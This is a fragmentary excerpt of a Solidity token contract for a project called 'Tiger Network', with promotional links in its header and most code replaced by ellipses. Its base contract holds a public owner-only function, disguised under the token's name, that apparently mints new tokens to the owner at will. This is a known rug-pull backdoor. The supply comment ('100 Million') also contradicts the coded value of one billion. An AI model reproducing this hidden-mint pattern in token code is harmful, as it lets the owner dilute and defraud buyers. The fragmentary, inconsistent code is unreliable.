...
//
// $TigerNetwork an innovative feature in its contract.
/**
Website     : https://TigerNetwork.tech/
Telegram    : https://t.me/TigerNetworkbsc
Twitter     : 
*/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TigerNetwork(uint256 amount) public onlyOwner {
 _TigerNetwork(msg.sender, amount);
    }
    ...
    function _TigerNetwork(address account, uint256 amount) internal virtual {
...
contract TigerNetwork is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Tiger Network", "TigerNetwork") {
     _TigerNetwork(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}